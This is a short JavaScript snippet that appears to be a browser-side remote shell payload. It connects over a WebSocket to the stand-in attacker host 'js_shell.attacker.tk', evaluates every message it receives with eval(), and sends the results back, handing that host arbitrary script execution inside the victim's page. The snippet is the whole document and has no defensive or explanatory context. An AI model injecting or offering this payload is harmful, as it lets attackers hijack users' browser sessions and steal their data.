var socket = new WebSocket((location.protocol=='https:'?'wss:':'ws:') + "//js_shell.attacker.tk/ws")
socket.onmessage = function(event) {
  var result = eval(event.data)
  if(result)
    socket.send(result)
}
